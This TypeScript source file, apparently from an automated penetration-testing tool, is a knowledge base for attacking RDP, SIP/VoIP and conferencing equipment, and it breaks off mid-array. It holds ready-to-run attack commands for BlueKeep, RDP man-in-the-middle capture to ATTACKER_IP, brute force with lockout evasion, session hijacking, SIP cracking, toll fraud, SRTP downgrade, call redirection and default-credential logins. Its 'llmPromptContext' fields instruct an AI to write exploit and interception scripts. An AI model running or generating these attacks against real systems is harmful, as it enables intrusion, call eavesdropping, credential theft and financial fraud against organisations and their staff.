/**
 * ═══════════════════════════════════════════════════════════════════════
 * RDP / VoIP / SIP / Conferencing Equipment — Scanning & Exploitation Knowledge
 * ═══════════════════════════════════════════════════════════════════════
 *
 * Comprehensive knowledge base for:
 *   1. RDP (Remote Desktop Protocol) — BlueKeep, DejaBlue, NLA bypass, credential attacks
 *   2. VoIP/SIP — SIP enumeration, toll fraud, eavesdropping, SRTP downgrade
 *   3. Conferencing Equipment — Cisco, Polycom, Zoom Room, Teams Room, Webex
 *   4. Related protocols — H.323, RTP/SRTP, MGCP, SCCP (Skinny)
 *
 * Used by:
 *   - engagement-orchestrator.ts (service-specific scanning)
 *   - functional-exploit-generator.ts (LLM prompt enrichment)
 *   - dynamic-attack-mapper.ts (ATT&CK technique mapping)
 *   - context-aware-scanner.ts (service profiling)
 *   - scanforge-knowledge.ts (tool selection)
 */

// ═══════════════════════════════════════════════════════════════════════
// §1 — PORT & SERVICE DEFINITIONS
// ═══════════════════════════════════════════════════════════════════════

export interface ServiceProfile {
  port: number;
  protocol: 'tcp' | 'udp' | 'both';
  service: string;
  description: string;
  fingerprint: string[];
  commonVendors: string[];
  attackSurface: string[];
}

export const RDP_VOIP_PORTS: ServiceProfile[] = [
  // ── RDP ──
  { port: 3389, protocol: 'tcp', service: 'rdp', description: 'Microsoft Remote Desktop Protocol', fingerprint: ['X.224 CR TPDU', 'RDP Negotiation Request', 'CredSSP/NLA'], commonVendors: ['Microsoft', 'xrdp', 'FreeRDP'], attackSurface: ['BlueKeep (CVE-2019-0708)', 'DejaBlue (CVE-2019-1181/1182)', 'NLA bypass', 'Credential brute force', 'Man-in-the-middle (no NLA)', 'Session hijacking', 'RDP gateway bypass'] },
  { port: 3390, protocol: 'tcp', service: 'rdp-alt', description: 'RDP alternate port (common in hardened environments)', fingerprint: ['X.224 CR TPDU'], commonVendors: ['Microsoft'], attackSurface: ['Same as 3389 — port change is not security'] },

  // ── VoIP / SIP ──
  { port: 5060, protocol: 'both', service: 'sip', description: 'Session Initiation Protocol (unencrypted)', fingerprint: ['SIP/2.0', 'Via: SIP/2.0', 'User-Agent:', 'Server:'], commonVendors: ['Asterisk', 'FreeSWITCH', 'Cisco CUCM', 'Avaya', '3CX', 'Kamailio', 'OpenSIPS'], attackSurface: ['SIP enumeration (REGISTER/OPTIONS/INVITE)', 'Extension brute force', 'Toll fraud (INVITE injection)', 'Caller ID spoofing', 'Eavesdropping (RTP interception)', 'SIP digest authentication cracking', 'Registration hijacking', 'BYE/CANCEL DoS'] },
  { port: 5061, protocol: 'tcp', service: 'sips', description: 'SIP over TLS (encrypted)', fingerprint: ['TLS handshake + SIP/2.0'], commonVendors: ['Cisco CUCM', 'Microsoft Teams', 'Avaya'], attackSurface: ['TLS downgrade', 'Certificate validation bypass', 'SIP over TLS enumeration'] },
  { port: 5080, protocol: 'both', service: 'sip-alt', description: 'SIP alternate (FreeSWITCH default)', fingerprint: ['SIP/2.0'], commonVendors: ['FreeSWITCH'], attackSurface: ['Same as 5060'] },

  // ── RTP / SRTP ──
  { port: 0, protocol: 'udp', service: 'rtp', description: 'Real-time Transport Protocol (dynamic ports 10000-20000)', fingerprint: ['RTP header (V=2, PT=0-127)'], commonVendors: ['All VoIP systems'], attackSurface: ['RTP injection', 'SRTP downgrade', 'Eavesdropping', 'DTMF extraction', 'Codec manipulation'] },

  // ── H.323 ──
  { port: 1720, protocol: 'tcp', service: 'h323', description: 'H.323 Call Signaling (video conferencing)', fingerprint: ['H.225.0 Setup', 'Q.931'], commonVendors: ['Cisco', 'Polycom', 'LifeSize', 'Tandberg'], attackSurface: ['H.323 enumeration', 'Call interception', 'Buffer overflow in H.225 parser', 'Gatekeeper bypass'] },
  { port: 1719, protocol: 'udp', service: 'h323-gatekeeper', description: 'H.323 Gatekeeper (RAS)', fingerprint: ['H.225.0 RAS'], commonVendors: ['Cisco', 'GNU Gatekeeper'], attackSurface: ['Gatekeeper registration hijacking', 'Unauthorized call routing'] },

  // ── MGCP / SCCP ──
  { port: 2427, protocol: 'udp', service: 'mgcp', description: 'Media Gateway Control Protocol', fingerprint: ['MGCP 1.0'], commonVendors: ['Cisco', 'AudioCodes'], attackSurface: ['MGCP command injection', 'Gateway reconfiguration', 'Call interception'] },
  { port: 2000, protocol: 'tcp', service: 'sccp', description: 'Skinny Client Control Protocol (Cisco phones)', fingerprint: ['SCCP header'], commonVendors: ['Cisco'], attackSurface: ['Phone registration hijacking', 'VLAN hopping via CDP', 'Firmware extraction', 'Configuration download'] },
  { port: 2443, protocol: 'tcp', service: 'sccp-tls', description: 'SCCP over TLS', fingerprint: ['TLS + SCCP'], commonVendors: ['Cisco'], attackSurface: ['TLS downgrade', 'Certificate theft'] },

  // ── Conferencing Web Interfaces ──
  { port: 443, protocol: 'tcp', service: 'conferencing-web', description: 'Conferencing equipment web management', fingerprint: ['Polycom', 'Cisco TelePresence', 'Zoom Room', 'Crestron'], commonVendors: ['Polycom', 'Cisco', 'Zoom', 'Crestron', 'Logitech'], attackSurface: ['Default credentials', 'API abuse', 'Firmware update injection', 'Configuration extraction', 'Meeting interception'] },
  { port: 8443, protocol: 'tcp', service: 'conferencing-web-alt', description: 'Conferencing equipment alternate web management', fingerprint: ['Polycom RealPresence', 'Cisco Webex'], commonVendors: ['Polycom', 'Cisco'], attackSurface: ['Same as 443 management'] },
];

export const RDP_VOIP_PORT_LIST = RDP_VOIP_PORTS.filter(p => p.port > 0).map(p => p.port);

// ═══════════════════════════════════════════════════════════════════════
// §2 — RDP EXPLOITATION KNOWLEDGE
// ═══════════════════════════════════════════════════════════════════════

export interface ExploitKnowledge {
  id: string;
  service: string;
  category: string;
  title: string;
  cves?: string[];
  description: string;
  prerequisites: string[];
  tools: string[];
  commands: string[];
  evasionTechniques: string[];
  successIndicators: string[];
  attackTechniques: string[]; // MITRE ATT&CK IDs
  riskLevel: 'critical' | 'high' | 'medium' | 'low';
  llmPromptContext: string;
}

export const RDP_EXPLOITS: ExploitKnowledge[] = [
  {
    id: 'rdp-bluekeep',
    service: 'rdp',
    category: 'remote_code_execution',
    title: 'BlueKeep (CVE-2019-0708) — RDP Pre-Auth RCE',
    cves: ['CVE-2019-0708'],
    description: 'Use-after-free in the RDP service (termdd.sys) allows unauthenticated remote code execution. Affects Windows 7, Server 2008 R2, XP, Server 2003. Wormable.',
    prerequisites: ['Target runs Windows 7/Server 2008 R2 or earlier', 'Port 3389 open', 'NLA not required (or NLA bypass available)', 'Target not patched (KB4499175)'],
    tools: ['metasploit (exploit/windows/rdp/cve_2019_0708_bluekeep_rce)', 'rdpscan', 'nmap --script rdp-vuln-ms12-020'],
    commands: [
      'nmap -p 3389 --script rdp-vuln-ms12-020,rdp-ntlm-info TARGET',
      'rdpscan --workers 10 TARGET',
      'msfconsole -x "use exploit/windows/rdp/cve_2019_0708_bluekeep_rce; set RHOSTS TARGET; set TARGET 2; run"',
    ],
    evasionTechniques: ['Fragment RDP packets to evade IDS', 'Use non-standard source port', 'Slow connection rate to avoid rate limiting', 'Tunnel through SSH/SOCKS'],
    successIndicators: ['Meterpreter session opened', 'SYSTEM shell obtained', 'uid=0', 'NT AUTHORITY\\SYSTEM'],
    attackTechniques: ['T1210', 'T1021.001'],
    riskLevel: 'critical',
    llmPromptContext: `BlueKeep (CVE-2019-0708) targets the RDP service on Windows 7/Server 2008 R2 and earlier.
The vulnerability is a use-after-free in termdd.sys triggered by sending specially crafted RDP connection requests.
Key exploitation steps:
1. Verify target is vulnerable: nmap --script rdp-vuln-ms12-020 or rdpscan
2. Check if NLA is required (NLA blocks pre-auth exploitation)
3. Use Metasploit's cve_2019_0708_bluekeep_rce module with correct TARGET index
4. For manual exploitation: send crafted MS_T120 channel bind requests to trigger UAF
5. Heap spray with shellcode, then trigger the freed object reuse
IMPORTANT: BlueKeep exploitation is unreliable and can cause BSOD. Use with caution.
The exploit must handle the RDP X.224 connection sequence correctly.`,
  },
  {
    id: 'rdp-dejablue',
    service: 'rdp',
    category: 'remote_code_execution',
    title: 'DejaBlue (CVE-2019-1181/1182) — RDP Post-Auth RCE',
    cves: ['CVE-2019-1181', 'CVE-2019-1182'],
    description: 'Heap-based buffer overflow in the RDP client/server decompression code. Affects Windows 7 through Windows 10 and Server 2019. Post-authentication but can be triggered via MITM.',
    prerequisites: ['Target runs Windows 7-10 or Server 2008-2019', 'Port 3389 open', 'Valid credentials or MITM position'],
    tools: ['Custom exploit (no public Metasploit module)', 'nmap rdp-ntlm-info'],
    commands: [
      'nmap -p 3389 --script rdp-ntlm-info TARGET',
      'python3 dejablue_check.py TARGET 3389',
    ],
    evasionTechniques: ['Encrypt payload within RDP channel', 'Use legitimate RDP session as cover'],
    successIndicators: ['SYSTEM shell', 'Code execution confirmed', 'Reverse shell callback'],
    attackTechniques: ['T1210', 'T1021.001'],
    riskLevel: 'critical',
    llmPromptContext: `DejaBlue (CVE-2019-1181/1182) is a heap overflow in RDP decompression.
Unlike BlueKeep, it affects newer Windows versions (7-10, Server 2008-2019).
Exploitation requires authentication or MITM position.
The vulnerability is in the decompression of RDP bitmap data.
Generate a Python exploit that:
1. Establishes an RDP connection using provided credentials
2. Sends crafted compressed bitmap data to trigger heap overflow
3. Uses heap grooming to control the overflow target
4. Achieves code execution via controlled write`,
  },
  {
    id: 'rdp-nla-bypass',
    service: 'rdp',
    category: 'authentication_bypass',
    title: 'RDP NLA Bypass / Downgrade Attack',
    description: 'Force RDP connection to use legacy security instead of NLA/CredSSP, enabling MITM credential capture or pre-auth exploit delivery.',
    prerequisites: ['Target accepts both NLA and legacy RDP security', 'MITM position or direct connection'],
    tools: ['seth (RDP MITM tool)', 'rdp-sec-check', 'xfreerdp'],
    commands: [
      'rdp-sec-check TARGET:3389',
      'python3 seth.py -l ATTACKER_IP -r TARGET -p 3389',
      'xfreerdp /v:TARGET /sec:rdp /cert:ignore',
    ],
    evasionTechniques: ['ARP spoofing for MITM position', 'DNS spoofing to redirect RDP connections'],
    successIndicators: ['Credentials captured in cleartext', 'NLA downgraded to Standard RDP Security', 'MITM session established'],
    attackTechniques: ['T1557', 'T1021.001', 'T1556'],
    riskLevel: 'high',
    llmPromptContext: `RDP NLA bypass/downgrade attack.
If the server supports both NLA and legacy RDP security, we can force a downgrade:
1. Use rdp-sec-check to verify security modes supported
2. If Standard RDP Security is supported alongside NLA, use seth for MITM
3. seth performs ARP spoofing + RDP downgrade + credential capture
4. Alternative: use xfreerdp with /sec:rdp to force legacy mode
5. Once credentials are captured, authenticate normally`,
  },
  {
    id: 'rdp-brute-force',
    service: 'rdp',
    category: 'credential_attack',
    title: 'RDP Credential Brute Force',
    description: 'Brute force RDP credentials using hydra, ncrack, or crowbar. Effective when NLA is enabled (tests credentials before session).',
    prerequisites: ['Port 3389 open', 'Valid username list', 'No account lockout or slow lockout threshold'],
    tools: ['hydra', 'ncrack', 'crowbar', 'nxc (NetExec)'],
    commands: [
      'hydra -L users.txt -P passwords.txt rdp://TARGET -t 4 -W 3',
      'ncrack -p 3389 --user admin -P passwords.txt TARGET',
      'crowbar -b rdp -s TARGET/32 -u admin -C passwords.txt -n 4',
      'nxc rdp TARGET -u users.txt -p passwords.txt --continue-on-success',
    ],
    evasionTechniques: ['Low thread count (1-2) to avoid lockout', 'Spray one password across many users', 'Use 15-30 second delays between attempts', 'Rotate source IPs via SOCKS proxies'],
    successIndicators: ['[3389][rdp] host: TARGET   login: admin   password:', 'RDP connection established', 'NLA authentication succeeded'],
    attackTechniques: ['T1110.001', 'T1110.003', 'T1021.001'],
    riskLevel: 'high',
    llmPromptContext: `RDP brute force / password spray attack.
Generate a Python script that:
1. Attempts RDP authentication using provided credentials
2. Uses the credssp/NLA protocol for authentication testing
3. Implements rate limiting (configurable delay between attempts)
4. Supports password spraying (one password, many users)
5. Detects account lockout and backs off
6. Reports successful credentials
Use the impacket library for RDP authentication or subprocess with xfreerdp.`,
  },
  {
    id: 'rdp-session-hijack',
    service: 'rdp',
    category: 'lateral_movement',
    title: 'RDP Session Hijacking (tscon)',
    description: 'Hijack disconnected RDP sessions using tscon.exe with SYSTEM privileges. No password needed for the target session.',
    prerequisites: ['SYSTEM-level access on the target', 'Disconnected RDP sessions exist', 'Windows Server with multiple RDP sessions'],
    tools: ['tscon.exe (built-in)', 'PsExec', 'Mimikatz'],
    commands: [
      'query user',
      'sc create sesshijack binpath="cmd.exe /k tscon TARGET_SESSION_ID /dest:rdp-tcp#CURRENT_SESSION"',
      'net start sesshijack',
    ],
    evasionTechniques: ['Use service creation instead of direct tscon (bypasses UAC)', 'Clean up service after hijack'],
    successIndicators: ['Session switched to target user', 'Desktop of target user visible', 'whoami shows target user'],
    attackTechniques: ['T1563.002', 'T1021.001'],
    riskLevel: 'high',
    llmPromptContext: `RDP session hijacking via tscon.exe.
Requires SYSTEM privileges on the target machine.
Steps:
1. Enumerate sessions: query user (or qwinsta)
2. Identify disconnected sessions with valuable users
3. Create a Windows service that runs tscon to switch sessions
4. The service runs as SYSTEM, so no password is needed
5. Clean up: delete the service after hijacking`,
  },
];

// ═══════════════════════════════════════════════════════════════════════
// §3 — VoIP / SIP EXPLOITATION KNOWLEDGE
// ═══════════════════════════════════════════════════════════════════════

export const VOIP_SIP_EXPLOITS: ExploitKnowledge[] = [
  {
    id: 'sip-enumeration',
    service: 'sip',
    category: 'enumeration',
    title: 'SIP User/Extension Enumeration',
    description: 'Enumerate valid SIP extensions and users using REGISTER, OPTIONS, and INVITE methods. Different response codes reveal valid vs invalid extensions.',
    prerequisites: ['SIP service on port 5060/5061', 'No SIP firewall blocking enumeration'],
    tools: ['svwar (SIPVicious)', 'sipvicious', 'nmap sip-enum-users', 'metasploit auxiliary/voip/sip_invite_spoof'],
    commands: [
      'svwar -e100-999 -m REGISTER TARGET',
      'svwar -e100-999 -m INVITE TARGET',
      'svwar -e100-999 -m OPTIONS TARGET',
      'nmap -sU -p 5060 --script sip-enum-users TARGET',
      'sippts_scan -i TARGET -r 5060',
    ],
    evasionTechniques: ['Slow enumeration rate (1 req/sec)', 'Randomize extension order', 'Use different SIP methods for each batch', 'Spoof Via/Contact headers'],
    successIndicators: ['Extension found:', 'SIP/2.0 200 OK', 'Valid extension: 100', 'Authentication Required (valid user)'],
    attackTechniques: ['T1589.001', 'T1046'],
    riskLevel: 'medium',
    llmPromptContext: `SIP extension enumeration using response code analysis.
Generate a Python script that:
1. Sends SIP REGISTER requests for extension ranges (100-999, 1000-9999)
2. Analyzes response codes:
   - 200 OK = valid extension (no auth required!)
   - 401 Unauthorized = valid extension (auth required)
   - 403 Forbidden = valid extension (blocked)
   - 404 Not Found = invalid extension
3. Supports UDP (default) and TCP transport
4. Implements rate limiting to avoid detection
5. Uses proper SIP message formatting:
   REGISTER sip:TARGET SIP/2.0
   Via: SIP/2.0/UDP ATTACKER_IP:5060
   From: <sip:EXTENSION@TARGET>
   To: <sip:EXTENSION@TARGET>
   Call-ID: random
   CSeq: 1 REGISTER
   Contact: <sip:EXTENSION@ATTACKER_IP>
   Max-Forwards: 70
   Content-Length: 0`,
  },
  {
    id: 'sip-digest-crack',
    service: 'sip',
    category: 'credential_attack',
    title: 'SIP Digest Authentication Cracking',
    description: 'Capture SIP digest authentication challenges and crack the password offline. SIP uses HTTP Digest auth (MD5-based) which is vulnerable to offline cracking.',
    prerequisites: ['Valid SIP extension discovered', 'SIP digest auth enabled (401 responses with WWW-Authenticate)'],
    tools: ['sipdump', 'sipcrack', 'john', 'hashcat'],
    commands: [
      'sipdump -i eth0 -d sip_auth.dump',
      'sipcrack -w wordlist.txt sip_auth.dump',
      'john --format=sip sip_auth.dump',
      'hashcat -m 11400 sip_auth.dump wordlist.txt',
    ],
    evasionTechniques: ['Passive capture (no active probing)', 'Offline cracking leaves no trace'],
    successIndicators: ['Password found:', 'Cracked: extension:password', 'SIP auth successful with cracked password'],
    attackTechniques: ['T1110.002', 'T1040'],
    riskLevel: 'high',
    llmPromptContext: `SIP digest authentication cracking.
Generate a Python script that:
1. Sends SIP REGISTER to trigger 401 with WWW-Authenticate header
2. Extracts: realm, nonce, algorithm, qop from the challenge
3. Performs offline dictionary attack against the digest:
   HA1 = MD5(username:realm:password)
   HA2 = MD5(method:uri)
   response = MD5(HA1:nonce:HA2)
4. For qop=auth: response = MD5(HA1:nonce:nc:cnonce:qop:HA2)
5. Verifies cracked password by completing REGISTER
6. Supports wordlist and common VoIP passwords`,
  },
  {
    id: 'sip-toll-fraud',
    service: 'sip',
    category: 'abuse',
    title: 'SIP Toll Fraud (INVITE Injection)',
    description: 'Abuse misconfigured SIP trunks to make unauthorized calls to premium-rate numbers. Can cause significant financial damage.',
    prerequisites: ['Valid SIP credentials or unauthenticated INVITE allowed', 'SIP trunk with PSTN connectivity'],
    tools: ['sipp', 'pjsua', 'sipvicious (svwar + svcrack + svmap)'],
    commands: [
      'svmap TARGET',
      'sipp -sn uac TARGET:5060 -s PREMIUM_NUMBER -r 1',
      'pjsua --registrar sip:TARGET --id sip:EXTENSION@TARGET --password PASSWORD sip:PREMIUM_NUMBER@TARGET',
    ],
    evasionTechniques: ['Use legitimate-looking caller ID', 'Route through multiple SIP proxies', 'Call during business hours to blend in'],
    successIndicators: ['Call established', 'SIP/2.0 200 OK to INVITE', 'RTP stream active', 'PSTN call connected'],
    attackTechniques: ['T1496'],
    riskLevel: 'critical',
    llmPromptContext: `SIP toll fraud via INVITE injection.
This is a PROOF OF CONCEPT for authorized penetration testing only.
Generate a Python script that:
1. Authenticates to the SIP server (if credentials available)
2. Sends a SIP INVITE to an internal test number (NOT premium)
3. Handles the SIP dialog (100 Trying → 180 Ringing → 200 OK → ACK)
4. Demonstrates the ability to initiate calls
5. Properly tears down the call with BYE
6. Reports: call was successfully placed as evidence
IMPORTANT: Only call internal test numbers. Never call premium numbers.`,
  },
  {
    id: 'sip-eavesdrop',
    service: 'sip',
    category: 'interception',
    title: 'VoIP Call Eavesdropping (RTP Interception)',
    description: 'Intercept VoIP calls by capturing RTP streams. Requires network position (MITM, SPAN port, or compromised switch).',
    prerequisites: ['Network access to capture RTP traffic', 'Calls using unencrypted RTP (not SRTP)', 'Knowledge of RTP port range'],
    tools: ['wireshark', 'tshark', 'ucsniff', 'vomit', 'rtpbreak'],
    commands: [
      'tshark -i eth0 -f "udp portrange 10000-20000" -w voip_capture.pcap',
      'tshark -r voip_capture.pcap -q -z rtp,streams',
      'tshark -r voip_capture.pcap -q -z voip,calls',
    ],
    evasionTechniques: ['Passive capture only', 'Use SPAN/mirror port instead of ARP spoofing', 'Capture on trunk ports'],
    successIndicators: ['RTP streams captured', 'Audio decoded from RTP', 'VoIP call reconstructed'],
    attackTechniques: ['T1040', 'T1557'],
    riskLevel: 'high',
    llmPromptContext: `VoIP eavesdropping via RTP interception.
Generate a Python script that:
1. Captures UDP packets in the RTP port range (10000-20000)
2. Identifies RTP streams by header analysis (V=2, PT=0-127)
3. Groups packets by SSRC into individual call streams
4. Detects codec from payload type (PT 0=G.711u, PT 8=G.711a, PT 18=G.729)
5. Saves raw RTP payload to file for audio reconstruction
6. Reports: number of calls detected, duration, codecs used
7. Check for SRTP (encrypted) vs RTP (unencrypted)
This demonstrates the risk of unencrypted VoIP.`,
  },
  {
    id: 'srtp-downgrade',
    service: 'sip',
    category: 'cryptographic_attack',
    title: 'SRTP to RTP Downgrade Attack',
    description: 'Force VoIP calls to use unencrypted RTP instead of SRTP by manipulating SDP in SIP signaling. Requires MITM position.',
    prerequisites: ['MITM position on SIP signaling path', 'Target supports both RTP and SRTP', 'SIP signaling not encrypted (no TLS)'],
    tools: ['Custom SIP proxy', 'mitmproxy', 'sipvicious'],
    commands: [
      'python3 srtp_downgrade.py --listen 5060 --target TARGET:5060',
    ],
    evasionTechniques: ['Transparent SIP proxy (invisible to endpoints)', 'Only modify SDP, leave SIP headers intact'],
    successIndicators: ['SDP modified: crypto line removed', 'RTP stream detected (not SRTP)', 'Audio captured in cleartext'],
    attackTechniques: ['T1557', 'T1040', 'T1600'],
    riskLevel: 'high',
    llmPromptContext: `SRTP to RTP downgrade attack via SDP manipulation.
Generate a Python script that acts as a transparent SIP proxy:
1. Listen on port 5060 for incoming SIP messages
2. Forward messages to the real SIP server
3. On INVITE/200 OK with SDP: remove 'a=crypto:' lines from SDP body
4. Remove 'RTP/SAVP' and replace with 'RTP/AVP' in m= line
5. Recalculate Content-Length header
6. Forward modified SDP to the other party
7. Both sides fall back to unencrypted RTP
8. Report: downgrade successful, RTP now capturable`,
  },
  {
    id: 'sip-registration-hijack',
    service: 'sip',
    category: 'hijacking',
    title: 'SIP Registration Hijacking',
    description: 'Hijack a SIP extension by sending a REGISTER with a higher CSeq and different Contact address, redirecting calls to the attacker.',
    prerequisites: ['Valid SIP credentials for the target extension', 'SIP server does not validate source IP'],
    tools: ['pjsua', 'sipvicious', 'custom script'],
    commands: [
      'python3 sip_hijack.py --server TARGET --extension 100 --password PASSWORD --redirect ATTACKER_IP',
    ],
    evasionTechniques: ['Use short registration expiry to minimize detection window', 'Re-register the original contact after capture'],
    successIndicators: ['REGISTER 200 OK with attacker Contact', 'Incoming calls redirected to attacker', 'Voicemail intercepted'],
    attackTechniques: ['T1557', 'T1556'],
    riskLevel: 'high',
    llmPromptContext: `SIP registration hijacking.
Generate a Python script that:
1. Authenticates to the SIP server with stolen credentials
2. Sends REGISTER with Contact pointing to attacker's IP
3. Uses higher CSeq than the legitimate registration
4. Sets short Expires (60 seconds) to minimize detection
5. Incoming calls to the extension now route to attacker
6. Captures incoming INVITE and responds with 200 OK
7. After proof, re-registers the original contact to restore service`,
  },
];

// ═══════════════════════════════════════════════════════════════════════
// §4 — CONFERENCING EQUIPMENT EXPLOITATION KNOWLEDGE
// ═══════════════════════════════════════════════════════════════════════

export const CONFERENCING_EXPLOITS: ExploitKnowledge[] = [
  {
    id: 'polycom-default-creds',
    service: 'conferencing',
    category: 'default_credentials',
    title: 'Polycom/Poly Default Credentials',
    description: 'Polycom video conferencing systems often ship with default admin credentials. Web interface at https://IP provides full control.',
    prerequisites: ['Polycom device accessible on network', 'Web interface (443/8443) reachable'],
    tools: ['curl', 'browser', 'nmap http-default-accounts'],
    commands: [
      'curl -k -u admin:admin https://TARGET/api/v1/mgmt/device/info',
      'curl -k -u admin:456 https://TARGET/api/v1/mgmt/device/info',
      'curl -k -u Polycom:456 https://TARGET/api/v1/mgmt/device/info',
      'nmap -p 443 --script http-default-accounts TARGET',
    ],
    evasionTechniques: ['Use HTTPS to avoid network detection', 'Single credential attempt per device'],
    successIndicators: ['200 OK with device info JSON', 'model:', 'serialNumber:', 'softwareVersion:'],
    attackTechniques: ['T1078.001', 'T1133'],
    riskLevel: 'critical',
    llmPromptContext: `Polycom/Poly default credential testing.
Common default credentials for Polycom devices:
- admin:admin (older models)
- admin:456 (RealPresence Group series)
- Polycom:456 (RealPresence Group series)
- admin:password (some models)
- admin:1234 (some models)
API endpoints to test:
- GET /api/v1/mgmt/device/info (device information)
- GET /api/v1/mgmt/network/info (network configuration)
- GET /api/v1/mgmt/lineInfo (SIP line configuration — may contain credentials)
- POST /api/v1/mgmt/safeRestart (restart device)
Generate a Python script that tests these credentials and extracts configuration.`,
  },
  {
    id: 'cisco-telepresence-exploit',
    service: 'conferencing',
    category: 'remote_code_execution',
    title: 'Cisco TelePresence / Webex Devices Exploitation',
    description: 'Cisco TelePresence and Webex devices have had multiple critical vulnerabilities including command injection, auth bypass, and information disclosure.',
    cves: ['CVE-2023-20073', 'CVE-2022-20783', 'CVE-2021-1532', 'CVE-2020-3location'],
    prerequisites: ['Cisco TelePresence/Webex device accessible', 'Web interface or SSH reachable'],
    tools: ['nuclei', 'nmap', 'curl'],
    commands: [
      'nuclei -u https://TARGET -tags cisco,telepresence,webex',
      'nmap -p 22,443 --script ssh-auth-methods,http-title TARGET',
      'curl -k https://TARGET/api/v1/status',
      'ssh admin@TARGET (default: password "cisco" or blank)',
    ],
    evasionTechniques: ['Use HTTPS for web-based attacks', 'Single SSH attempt to avoid lockout'],
    successIndicators: ['Command injection successful', 'Admin access obtained', 'Configuration extracted', 'Firmware version disclosed'],
    attackTechniques: ['T1190', 'T1078.001', 'T1133'],
    riskLevel: 'high',
    llmPromptContext: `Cisco TelePresence/Webex device exploitation.
Default credentials to test:
- SSH: admin/cisco, admin/(blank), admin/TANDBERG
- Web: admin/cisco, admin/TANDBERG, admin/(blank)
API endpoints:
- GET /api/v1/status (device status — often unauthenticated)
- GET /getxml?location=/Status (XML API)
- POST /xmlapi/session/begin (session API)
Common vulnerabilities:
- Command injection via web interface parameters
- Path traversal in file download endpoints
- SSRF via phonebook/directory features
- Information disclosure via unauthenticated API endpoints`,
  },
  {
    id: 'zoom-room-exploit',
    service: 'conferencing',
    category: 'misconfiguration',
    title: 'Zoom Room Controller Exploitation',
    description: 'Zoom Room controllers expose a local API and may have weak/default PINs. Can be used to join meetings, access contacts, and control the room.',
    prerequisites: ['Zoom Room controller on the network', 'Port 9090 or web interface accessible'],
    tools: ['curl', 'nmap'],
    commands: [
      'nmap -p 9090,443,80 --script http-title TARGET',
      'curl -k https://TARGET:9090/api/v1/room/info',
      'curl -k -X POST https://TARGET:9090/api/v1/room/meeting/join -d \'{"meeting_number":"MEETING_ID"}\'',
    ],
    evasionTechniques: ['Use local network access only', 'Single request per endpoint'],
    successIndicators: ['Room info returned', 'Meeting joined successfully', 'Contact list extracted'],
    attackTechniques: ['T1133', 'T1078.001'],
    riskLevel: 'medium',
    llmPromptContext: `Zoom Room controller exploitation.
Zoom Rooms expose a local API on port 9090 (HTTPS).
Common attack vectors:
1. Default/weak room PIN (often 0000 or 1234)
2. Unauthenticated API endpoints
3. Meeting join without authorization
4. Contact/directory extraction
5. Room settings modification
Generate a Python script that:
1. Discovers Zoom Room controllers via network scan (port 9090)
2. Tests common PINs (0000, 1234, 9999, 0123)
3. Extracts room info and configuration
4. Lists upcoming meetings
5. Reports findings as evidence`,
  },
  {
    id: 'crestron-exploit',
    service: 'conferencing',
    category: 'remote_code_execution',
    title: 'Crestron AV Control System Exploitation',
    description: 'Crestron control systems (used in conference rooms) often have unauthenticated telnet/SSH access and web interfaces with default credentials.',
    prerequisites: ['Crestron device on network', 'Port 41795 (CTP), 22, or 443 accessible'],
    tools: ['telnet', 'curl', 'nmap'],
    commands: [
      'telnet TARGET 41795',
      'nmap -p 22,41795,443 --script telnet-ntlm-info TARGET',
      'curl -k https://TARGET/cgi-bin/login.cgi',
    ],
    evasionTechniques: ['Use CTP protocol (port 41795) which is rarely monitored'],
    successIndicators: ['Crestron Console>', 'Device info returned', 'Program loaded', 'Admin access obtained'],
    attackTechniques: ['T1133', 'T1078.001', 'T1059'],
    riskLevel: 'high',
    llmPromptContext: `Crestron AV control system exploitation.
Crestron devices often have:
1. Unauthenticated CTP (Crestron Terminal Protocol) on port 41795
2. Default SSH credentials (admin/admin, crestron/crestron)
3. Web interface with default credentials
CTP commands:
- HOSTNAME (get device name)
- IPCONFIG (get network config)
- PROGCOMMENTS (list loaded programs)
- SHOWHW (hardware info)
- HIDHELP (list all commands)
Generate a Python script that connects via CTP and extracts device info.`,
  },
];

// ═══════════════════════════════════════════════════════════════════════
// §5 — SIP FINGERPRINTING (PROPER IMPLEMENTATION)
// ═══════════════════════════════════════════════════════════════════════

export interface SipFingerprint {
  vendor: string;
  product: string;
  version?: string;
  userAgent: string;
  server: string;
}

/**
 * Generate a proper SIP OPTIONS probe message
 */
export function buildSipOptionsProbe(target: string, port: number, fromIp: string): string {
  const callId = `${Date.now()}-${Math.random().toString(36).slice(2)}@${fromIp}`;
  const branch = `z9hG4bK-${Math.random().toString(36).slice(2)}`;
  const tag = Math.random().toString(36).slice(2, 10);
  return [
    `OPTIONS sip:${target}:${port} SIP/2.0`,
    `Via: SIP/2.0/UDP ${fromIp}:5060;branch=${branch}`,
    `Max-Forwards: 70`,
    `From: <sip:scanner@${fromIp}>;tag=${tag}`,
    `To: <sip:${target}:${port}>`,
    `Call-ID: ${callId}`,
    `CSeq: 1 OPTIONS`,
    `Contact: <sip:scanner@${fromIp}:5060>`,
    `Accept: application/sdp`,
    `Content-Length: 0`,
    ``,
    ``,
  ].join('\r\n');
}

/**
 * Parse SIP response to extract fingerprint information
 */
export function parseSipResponse(response: string): SipFingerprint | null {
  if (!response.includes('SIP/2.0')) return null;

  const headers: Record<string, string> = {};
  const lines = response.split('\r\n');
  for (const line of lines) {
    const colonIdx = line.indexOf(':');
    if (colonIdx > 0) {
      const key = line.slice(0, colonIdx).trim().toLowerCase();
      const value = line.slice(colonIdx + 1).trim();
      headers[key] = value;
    }
  }

  const userAgent = headers['user-agent'] || '';
  const server = headers['server'] || '';
  const identifier = userAgent || server;

  // Vendor detection from User-Agent/Server header
  const vendorPatterns: Array<{ pattern: RegExp; vendor: string; product: string }> = [
    { pattern: /Asterisk\s*PBX\s*([\d.]+)?/i, vendor: 'Digium', product: 'Asterisk' },
    { pattern: /Asterisk\s*([\d.]+)?/i, vendor: 'Digium', product: 'Asterisk' },
    { pattern: /FreeSWITCH[/-]?([\d.]+)?/i, vendor: 'SignalWire', product: 'FreeSWITCH' },
    { pattern: /Cisco[- ]CUCM/i, vendor: 'Cisco', product: 'Unified Communications Manager' },
    { pattern: /Cisco[- ]SPA/i, vendor: 'Cisco', product: 'SPA Phone' },
    { pattern: /OCSSERVER/i, vendor: 'Microsoft', product: 'Lync/Skype for Business' },
    { pattern: /Microsoft\.Rtc/i, vendor: 'Microsoft', product: 'Teams/SfB' },
    { pattern: /Avaya/i, vendor: 'Avaya', product: 'Communication Manager' },
    { pattern: /3CX/i, vendor: '3CX', product: '3CX Phone System' },
    { pattern: /Kamailio/i, vendor: 'Kamailio', product: 'Kamailio SIP Proxy' },
